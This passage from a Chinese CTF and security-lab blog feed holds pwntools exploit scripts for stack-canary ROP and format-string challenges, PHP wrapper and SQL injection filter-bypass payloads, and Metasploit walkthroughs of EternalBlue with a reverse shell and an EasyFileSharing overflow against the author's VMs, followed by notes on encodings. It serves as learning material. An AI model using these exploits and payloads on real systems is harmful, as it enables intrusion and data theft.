<figure data-type="image" tabindex="24"><img src="https://7usai.github.io/post-images/1601205404190.png" alt="" loading="lazy"></figure>
<p>放入010editor</p>
<figure data-type="image" tabindex="25"><img src="https://7usai.github.io/post-images/1601205410895.png" alt="" loading="lazy"></figure>
<p>09为-，20为.，0D0A为\转化摩斯密码</p>
<figure data-type="image" tabindex="26"><img src="https://7usai.github.io/post-images/1601205417668.jpg" alt="" loading="lazy"></figure>
<h3 id="兔兔那么可爱">兔兔那么可爱</h3>
<p>以txt方式打开flag文件</p>
<figure data-type="image" tabindex="27"><img src="https://7usai.github.io/post-images/1601205424847.png" alt="" loading="lazy"></figure>
<p>斐波那契数列</p>
<h4 id="脚本-8">脚本</h4>
<pre><code>filename=&quot;C://Users/lenovo/Desktop/Misc3/flag.txt&quot;
fp=open(filename,&quot;r&quot;)
content=fp.read()
fp.close()
nterms = int(input(&quot;你需要几项？&quot;))
n1 = 0
n2 = 1
count = 2
if nterms &lt;= 0:
    print(&quot;请输入一个正整数。&quot;)
elif nterms == 1:
    print(&quot;斐波那契数列：&quot;)
    print(n1)
else:
    print(&quot;斐波那契数列：&quot;)
    print(n1, &quot;,&quot;, n2, end=&quot; , &quot;)
    while count &lt; nterms:
        nth = n1 + n2
        print(nth, end=&quot; , &quot;)
        print(content[nth-1])
        n1 = n2
        n2 = nth
        count += 1
</code></pre>
<p>得flag</p>
<h2 id="pwn">pwn</h2>
<h3 id="test_nc">test_nc</h3>
<p>nc一下加qq要flag</p>
<figure data-type="image" tabindex="28"><img src="https://7usai.github.io/post-images/1601205435175.png" alt="" loading="lazy"></figure>
<h3 id="babystack">babystack</h3>
<p>当输入为1_love_y0u时拿到shell</p>
<h3 id="canary">canary</h3>
<figure data-type="image" tabindex="29"><img src="https://7usai.github.io/post-images/1601205443639.png" alt="" loading="lazy"></figure>
<p>buf在rsp+10，v3在rsp+48，两个相距0x38，输入‘a’*0x38，泄露出来canary的值，但是要减去换行符0xa，再通过ROPgadget找到sh的地址，构造payload。</p>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
r=remote('202.119.201.197',10004)
elf=ELF('./canary')
sys=0x4005F0
sh_addr=0x0400904
ret_rdi=0x00000000004008e3
r.recvuntil(&quot;Let's pwn it!&quot;)
payload='a'*0x38
r.sendline(payload)
r.recvuntil('a'*0x38)
canary=r.recv(8)
canary=canary.ljust(8,'\x00')
canary=u64(canary)-0xa
log.info(&quot;canary:&quot;+hex(canary))
payload=&quot;\x90&quot;*0x38+p64(canary)+&quot;\x90&quot;*0x8+p64(sh_addr)+p64(sys)
r.sendline(payload)
r.recv()
r.interactive()
</code></pre>
<h3 id="fmstr">fmstr</h3>
<figure data-type="image" tabindex="30"><img src="https://7usai.github.io/post-images/1601205452797.png" alt="" loading="lazy"></figure>
<p>Gets（）不限制输入，printf处有格式化字符串漏洞，可以从中泄露出输入的偏移，然后用fmstr_payload()把puts的got表中的内容改为backdoor的地址</p>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
from LibcSearcher import *
r=remote('202.119.201.197',10006)
elf=ELF('./fmstr')
sys=0x0804857D
puts_got=elf.got['puts']
payload=fmtstr_payload(8,{puts_got:sys})
r.sendline(payload)
r.interactive()
</code></pre>
<h3 id="babyrop">babyrop</h3>
<figure data-type="image" tabindex="31"><img src="https://7usai.github.io/post-images/1601205468718.png" alt="" loading="lazy"></figure>
<p>buf实际在ebp-6c，但却要输入0x100，存在溢出，并没有在发现system（），但发现可以通过泄露write的got表的内容得到write的实际地址，然后通过泄露出的地址的后三位查找libc的版本</p>
<h2 id="web">web</h2>
<h3 id="web签到">web签到</h3>
<p>步骤</p>
<figure data-type="image" tabindex="32"><img src="https://7usai.github.io/post-images/1601205478240.png" alt="" loading="lazy"></figure>
<p>打开发现需要GET传参但并未指明参数，多次尝试发现只需要传入?1即可；</p>
<figure data-type="image" tabindex="33"><img src="https://7usai.github.io/post-images/1601205485110.png" alt="" loading="lazy"></figure>
<ol>
<li>传入发现需要post一个2，多次尝试发现并没有反应，于是使用burpsuite</li>
</ol>
<figure data-type="image" tabindex="34"><img src="https://7usai.github.io/post-images/1601205494381.png" alt="" loading="lazy"></figure>
<p>在params里填好参数后发现2后面多了一个等号，然后就传参成功，并且发现php代码；</p>
<figure data-type="image" tabindex="35"><img src="https://7usai.github.io/post-images/1601205503388.png" alt="" loading="lazy"></figure>
<p>明显是使用PHP伪协议查看源文件即可获得flag</p>
<figure data-type="image" tabindex="36"><img src="https://7usai.github.io/post-images/1601205511353.png" alt="" loading="lazy"></figure>
<p>base64解码即可</p>
<figure data-type="image" tabindex="37"><img src="https://7usai.github.io/post-images/1601205520780.png" alt="" loading="lazy"></figure>
<h3 id="babysqli">Babysqli</h3>
<p>使用burpsuite进行注入后发现空格被过滤了，使用/**/ 替代空格；</p>
<figure data-type="image" tabindex="38"><img src="https://7usai.github.io/post-images/1601205528504.png" alt="" loading="lazy"></figure>
<p>并且发现下方注释，猜测flag可能在password里面，使用SQL语句查询</p>
<figure data-type="image" tabindex="39"><img src="https://7usai.github.io/post-images/1601205537338.png" alt="" loading="lazy"></figure>
<p>发现flag，成功</p>
<h3 id="secret">Secret</h3>
<p>发现图片，并且下载图片，按文本格式打开，后发现php代码</p>
<figure data-type="image" tabindex="40"><img src="https://7usai.github.io/post-images/1601205544688.png" alt="" loading="lazy"></figure>
<p>进行代码审计，题目要求需要使用GET方式提交param1和param2,然后使用POST方式提交param1与 param2;file_get_contents(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mo>)</mo><mi mathvariant="normal">是</mi><mi mathvariant="normal">指</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mi mathvariant="normal">以</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">形</mi><mi mathvariant="normal">式</mi><mi mathvariant="normal">写</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">，</mi><mi>i</mi><msub><mi>s</mi><mi>n</mi></msub><mi>u</mi><mi>m</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>c</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">str1)是指需要str1以文件的形式写入值，is_numeric(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">形</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mopen">(</span></span></span></span>str2)是判断str2是否为数字并且可以识别十进制和十六进制，str2需要等于2592000，sleep()函数是要程序沉睡一段时间，if(((string)<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mo>!</mo><mo>=</mo><mo>=</mo><mo>(</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">str1!==(string)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span></span></span></span>str2)&amp;&amp;(sha1(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mo>)</mo><mo>=</mo><mo>=</mo><mo>=</mo><mi>s</mi><mi>h</mi><mi>a</mi><mn>1</mn><mo>(</mo></mrow><annotation encoding="application/x-tex">str1)===sha1(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord">1</span><span class="mopen">(</span></span></span></span>str2)))是指需要让str1与str2的字符串形式不同，并且经过sha1()后相同；绕过这些限制救可获得flag；</p>
<figure data-type="image" tabindex="41"><img src="https://7usai.github.io/post-images/1601205552672.png" alt="" loading="lazy"></figure>
<blockquote>
<p>使用十六进制绕过sleep()函数；</p>
<p>使用data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k向str2中写入内容</p>
<p>关于sha1()函数的绕过，网上查找到文章https://www.addon.pub/2017/10/13/CTF-sha1%E5%92%8CMD5/</p>
</blockquote>
<h3 id="babysqli2">Babysqli2</h3>
<p>按照传统试一试平常的注入语句，之后发现过滤了单引号，网上查询可使用斜杠转义前面的单引号；</p>
<figure data-type="image" tabindex="42"><img src="https://7usai.github.io/post-images/1601205565567.png" alt="" loading="lazy"></figure>
<p>绕过成功，但是只显示了登录成功信息，猜测多半是盲注；发现substr() mid() 等函数被过滤了，但是left()仍可以使用；</p>
<p>由于flag的开头为C 所以就尝试猜测flag在password中的位置<img src="https://7usai.github.io/post-images/1601205573480.png" alt="" loading="lazy"></p>
<p>结果发现flag在第九行；之后便使用笨办法对flag进行逐个字母爆破，下方即为最终爆破结果，按照ascii码表转换为字母即可格式为		CUMTCTF{}，大括号内全为小写；</p>
<figure data-type="image" tabindex="43"><img src="https://7usai.github.io/post-images/1601205580981.png" alt="" loading="lazy"></figure>
<h3 id="简单文件包含">简单文件包含</h3>
<p>页面提示需要只支持本地请求，使用burpsuite，X-Forwarded-For：127.0.0.1 没有反应  然后尝试使用client-ip:127.0.0.1  成功；</p>
<figure data-type="image" tabindex="44"><img src="https://7usai.github.io/post-images/1601205588605.png" alt="" loading="lazy"></figure>
<p>发现使用了include_once()函数，并且使用了两次，该函数只能包含同一文件一次，继续网上查找方法；发现一个重复require_once()的函数的文章，是使用伪协议配合多级符号链接的办法进行绕过的；</p>
<pre><code>php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
</code></pre>
<figure data-type="image" tabindex="45"><img src="https://7usai.github.io/post-images/1601205595546.png" alt="" loading="lazy"></figure>
<p>base64解码即可</p>
<figure data-type="image" tabindex="46"><img src="https://7usai.github.io/post-images/1601205601495.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ms17-010漏洞利用]]></title>
        <id>https://7usai.github.io/post/9s2K54U7q/</id>
        <link href="https://7usai.github.io/post/9s2K54U7q/">
        </link>
        <updated>2020-09-20T08:16:24.000Z</updated>
        <content type="html"><![CDATA[<p>安装win7虚拟机</p>
<p>开启win7 445端口</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600589823167.png" alt="" loading="lazy"></figure>
<p><img src="https://7usai.github.io/post-images/1600589829978.png" alt="" loading="lazy"><br>
开启msf<br>
<img src="https://7usai.github.io/post-images/1600589833942.png" alt="" loading="lazy"></p>
<p>寻找攻击模块</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600589837383.png" alt="" loading="lazy"></figure>
<p>调用模块use exploit/windows/smb/ms17_010_eternalblue</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600589841598.png" alt="" loading="lazy"></figure>
<p>show payloads后选windows/x64/meterpreter/reverse_tcp</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600589845319.png" alt="" loading="lazy"></figure>
<p>开始攻击</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1600589849159.png" alt="" loading="lazy"></figure>
<p>成功获得shell</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[利用msf利用easyfilesharing漏洞]]></title>
        <id>https://7usai.github.io/post/1ucQSUb1Y/</id>
        <link href="https://7usai.github.io/post/1ucQSUb1Y/">
        </link>
        <updated>2020-09-20T03:46:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="思路">思路</h3>
<p>1.安装一个win10虚拟机<br>
2.开启win10虚拟机端口<br>
3.开始攻击</p>
<p>win10ip地址</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600573646446.png" alt="" loading="lazy"></figure>
<p>查看开启端口</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600573658331.png" alt="" loading="lazy"></figure>
<p>这里可以看到80端口为easyfilesharing，因为在win10虚拟机里我们设置的就为80</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600573677088.png" alt="" loading="lazy"></figure>
<p>搜索EasyFileSharing漏洞</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600573690601.png" alt="" loading="lazy"></figure>
<p>设置攻击模块</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1600573704435.png" alt="" loading="lazy"></figure>
<p>show payloads后选择第52个</p>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1600573712860.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1600573771977.png" alt="" loading="lazy"></figure>
<p>在这里可以看到缺少一个RHOSTS和一个LHOST，RHOSTS为靶机IP（win10虚拟机），LHOSTS为攻击者IP（kali）</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1600573785155.png" alt="" loading="lazy"></figure>
<p>查看kali ip地址</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1600573798152.png" alt="" loading="lazy"></figure>
<p>设置ip地址</p>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1600573806372.png" alt="" loading="lazy"></figure>
<p>此漏洞失败</p>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1600573816668.png" alt="" loading="lazy"></figure>
<h3 id="尝试栈溢出漏洞">尝试栈溢出漏洞</h3>
<p>首先我们查看easyfilesharing上存在哪些漏洞</p>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1600573827540.png" alt="" loading="lazy"></figure>
<p>我们选取这个进行栈溢出漏洞攻击</p>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1600573834729.png" alt="" loading="lazy"></figure>
<p>利用漏洞脚本</p>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1600573841739.png" alt="" loading="lazy"></figure>
<p>打开了计算器并且关闭了easyfilesharing</p>
<p><img src="https://7usai.github.io/post-images/1600573847447.png" alt="" loading="lazy"><br>
<img src="https://7usai.github.io/post-images/1600573853001.png" alt="" loading="lazy"></p>
<h3 id="漏洞利用成功">漏洞利用成功</h3>
<p>利用溢出漏洞攻击目标并让其服务崩溃和让主机运行计算器</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[URL,ASCII,Unicode,Base64]]></title>
        <id>https://7usai.github.io/post/BNdT9mz74/</id>
        <link href="https://7usai.github.io/post/BNdT9mz74/">
        </link>
        <updated>2020-09-19T11:13:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="url编码">URL编码</h3>
<p>URI所允许的字符分作<strong>保留</strong>与<strong>未保留</strong>。<strong>保留</strong>字符是那些具有特殊含义的字符，例如：<a href="https://zh.wikipedia.org/wiki/%E6%96%9C%E7%B7%9A">斜线</a>字符用于URL（或URI）不同部分的分界符；<strong>未保留</strong>字符没有这些特殊含义。百分号编码把保留字符表示为特殊字符序列。上述情形随URI与URI的不同版本规格会有轻微的变化。</p>
<h4 id="对保留字符的百分号编码">对保留字符的百分号编码</h4>
<p>首先需要把该字符的ASCII的值表示为两个16进制的数字，然后在其前面放置<a href="https://zh.wikipedia.org/wiki/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6">转义字符</a>(&quot;<code>%</code>&quot;)，置入URI中的相应位置。</p>
<h4 id="对未保留字符的百分号编码">对未保留字符的百分号编码</h4>
<p>未保留字符不需要百分号编码.</p>
<h4 id="对百分号字符的百分号编码">对百分号字符的百分号编码</h4>
<p>由于百分号字符(&quot;%&quot;)表示百分号编码字节流的存在, 因此百分号字符应该被编码为3个字节的序列：&quot;%25&quot;，用于URI内部(0x25为%的ascii码)</p>
<p>编码表可以简单的以ASCII码表为准(见下)</p>
<p><a href="https://zh.wikipedia.org/wiki/%E7%99%BE%E5%88%86%E5%8F%B7%E7%BC%96%E7%A0%81">URL编码_wiki百科</a></p>
<h2 id="ascii编码">ASCII编码</h2>
<p>ASCII 由电报码发展而来，经过多次更新至今为止共定义了128个字符；其中33个字符无法显示（一些终端提供了扩展，使得这些字符可显示为诸如笑脸、扑克牌花式等8-bit符号），且这33个字符多数都已是陈废的<a href="https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E5%85%83">控制字符</a>。控制字符的用途主要是用来操控已经处理过的文字。<br>
可以简单的分为控制字符和可显示字符</p>
<p>用十进制来表示的话，0<sub>31+127位为控制字符，32</sub>126为可显示字符，其中48～57为0到9十个阿拉伯数字。65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等</p>
<p><a href="https://zh.wikipedia.org/wiki/ASCII">ASCII_wiki百科</a></p>
<h2 id="unicode码">Unicode码</h2>
<p><a href="https://baike.baidu.com/item/Unicode">Unicode</a>是一个编码方案，Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6">二进制</a>编码，以满足跨语言、跨平台进行文本转换、处理的要求。Unicode 编码共有三种具体实现，分别为utf-8,utf-16,utf-32，其中utf-8占用一到四个字节，utf-16占用二或四个字节，utf-32占用四个字节。</p>
<p>Unicode码扩展自ASCII<a href="https://baike.baidu.com/item/%E5%AD%97%E5%85%83%E9%9B%86">字元集</a>。Unicode使用全16位元字元集。这使得Unicode能够表示世界上所有的书写语言中可能用於电脑通讯的字元、象形文字和其他符号。</p>
<p>Unicode最初打算作为ASCII的补充，可能的话，最终将代替它。</p>
<p>Unicode码一直在修正扩充，目前已经包含的文字有：<a href="https://zh.wikipedia.org/wiki/%E9%98%BF%E6%8B%89%E4%BC%AF%E5%AD%97%E6%AF%8D">阿拉伯字母</a>、<a href="https://zh.wikipedia.org/wiki/%E4%BA%9E%E7%BE%8E%E5%B0%BC%E4%BA%9E%E5%AD%97%E6%AF%8D">亚美尼亚字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%AD%9F%E5%8A%A0%E6%8B%89%E6%96%87">孟加拉文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%A8%E9%9F%B3%E7%AC%A6%E8%99%9F">注音符号</a>、<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E9%87%8C%E7%88%BE%E5%AD%97%E6%AF%8D">西里尔字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A4%A9%E5%9F%8E%E6%96%87">天城文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E9%B2%81%E5%90%89%E4%BA%9A%E5%AD%97%E6%AF%8D">格鲁吉亚字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E8%87%98%E5%AD%97%E6%AF%8D">希腊字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%90%89%E6%8B%89%E7%89%B9%E6%96%87">古吉拉特文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E6%9C%A8%E5%9F%BA%E6%96%87">古木基文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%AB%BA%E6%96%87">谚文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E4%BC%AF%E4%BE%86%E5%AD%97%E6%AF%8D">希伯来字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B9%B3%E5%81%87%E5%90%8D">平假名</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8D%A1%E7%B4%8D%E9%81%94%E6%96%87">卡纳达文</a>、<a href="https://zh.wikipedia.org/wiki/%E7%89%87%E5%81%87%E5%90%8D">片假名</a>、<a href="https://zh.wikipedia.org/wiki/%E5%AF%AE%E6%96%87%E5%AD%97">寮文字</a>、<a href="https://zh.wikipedia.org/wiki/%E6%8B%89%E4%B8%81%E5%AD%97%E6%AF%8D">拉丁字母</a>、<a href="https://zh.wikipedia.org/wiki/%E9%A6%AC%E6%8B%89%E9%9B%85%E6%8B%89%E5%A7%86%E6%96%87">马拉雅拉姆文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A5%A7%E9%87%8C%E4%BA%9E%E6%96%87">奥里亚文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E7%B1%B3%E7%88%BE%E6%96%87">泰米尔文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E5%8D%A2%E5%9B%BA%E6%96%87">泰卢固文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E6%96%87%E5%AD%97">泰文字</a>、<a href="https://zh.wikipedia.org/wiki/%E6%AD%90%E5%85%83%E7%AC%A6%E8%99%9F">欧元符号</a>、对象替换字符、<a href="https://zh.wikipedia.org/wiki/%E5%88%87%E7%BD%97%E5%9F%BA%E6%96%87">切罗基文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%90%89%E8%8C%B2%E5%AD%97%E6%AF%8D">吉兹字母</a>，<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E6%A3%89%E5%AD%97%E6%AF%8D">高棉字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%92%99%E5%8F%A4%E5%AD%97%E6%AF%8D">蒙古字母</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BC%85%E6%96%87">缅文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%AD%90%E7%94%98%E5%AD%97%E6%AF%8D">欧甘字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8D%A2%E6%81%A9%E5%AD%97%E6%AF%8D">卢恩字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%83%A7%E4%BC%BD%E7%BE%85%E6%96%87">僧伽罗文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%95%98%E5%88%A9%E4%BA%9E%E5%AD%97%E6%AF%8D">叙利亚字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%AE%83%E6%8B%BF%E5%AD%97%E6%AF%8D">它拿字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8A%A0%E6%8B%BF%E5%A4%A7%E5%8E%9F%E4%BD%8F%E6%B0%91%E9%9F%B3%E7%AF%80%E6%96%87%E5%AD%97">加拿大原住民音节文字</a>、<a href="https://zh.wikipedia.org/wiki/%E5%BD%9D%E6%96%87">彝文</a><br>
、部分盲文图案、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%BE%B7%E7%91%9F%E9%9B%B7%E7%89%B9%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">德瑟雷特字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%93%A5%E7%89%B9%E5%AD%97%E6%AF%8D">哥特字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E6%84%8F%E5%A4%A7%E5%88%A9%E5%AD%97%E6%AF%8D">古意大利字母</a>、<a href="https://zh.wikipedia.org/wiki/%E9%9F%B3%E6%A8%82%E7%AC%A6%E8%99%9F">音乐符号</a>、<a href="https://zh.wikipedia.org/wiki/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E9%9F%B3%E4%B9%90%E7%AC%A6%E5%8F%B7">拜占庭音乐符号</a>，<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E6%97%A5%E9%9F%A9%E7%BB%9F%E4%B8%80%E8%A1%A8%E6%84%8F%E6%96%87%E5%AD%97">中日韩统一表意文字</a>、<a href="https://zh.wikipedia.org/wiki/%E8%8F%B2%E5%BE%8B%E5%AE%BE">菲律宾</a>文字<a href="https://zh.wikipedia.org/wiki/%E5%B8%83%E9%94%A1%E6%96%87">布锡文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%93%88%E5%8A%AA%E8%AF%BA%E6%96%87&amp;action=edit&amp;redlink=1">哈努诺文</a>、<a href="https://zh.wikipedia.org/wiki/%E4%BB%96%E5%8A%A0%E7%A5%BF%E6%96%87">他加禄文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%A1%94%E6%A0%BC%E5%B7%B4%E5%A5%B4%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">塔格巴奴亚文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A1%9E%E6%B5%A6%E8%B7%AF%E6%96%AF%E9%9F%B3%E8%8A%82%E6%96%87%E5%AD%97">塞浦路斯音节文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9E%97%E5%B8%83%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">林布字母</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BA%BF%E5%BD%A2%E6%96%87%E5%AD%97B">线形文字B</a>，<a href="https://zh.wikipedia.org/wiki/%E5%A5%A7%E6%96%AF%E6%9B%BC%E4%BA%9E%E5%AD%97%E6%AF%8D">奥斯曼亚字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%95%AD%E4%BC%AF%E7%B4%8D%E5%AD%97%E6%AF%8D">萧伯纳字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%BE%B7%E5%AE%8F%E5%82%A3%E6%96%87">德宏傣文</a>，<a href="https://zh.wikipedia.org/wiki/%E4%B9%8C%E5%8A%A0%E9%87%8C%E7%89%B9%E5%AD%97%E6%AF%8D">乌加里特字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%85%AD%E5%8D%81%E5%9B%9B%E5%8D%A6">六十四卦</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%83%E5%90%89%E6%96%87&amp;action=edit&amp;redlink=1">布吉文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E6%8B%89%E5%93%A5%E9%87%8C%E5%AD%97%E6%AF%8D">格拉哥里字母</a>，<a href="https://zh.wikipedia.org/wiki/%E4%BD%89%E5%8D%A2%E6%96%87">佉卢文</a>，<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E5%8F%8C%E7%89%88%E7%BA%B3%E5%82%A3%E6%96%87">西双版纳傣文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%A4%E6%B3%A2%E6%96%AF%E6%96%87&amp;action=edit&amp;redlink=1">古波斯文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%94%A1%E5%B0%94%E8%B5%AB%E7%89%B9%E6%96%87&amp;action=edit&amp;redlink=1">锡尔赫特文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%8F%90%E9%9D%9E%E7%B4%8D%E6%96%87">提非纳文</a> 、<a 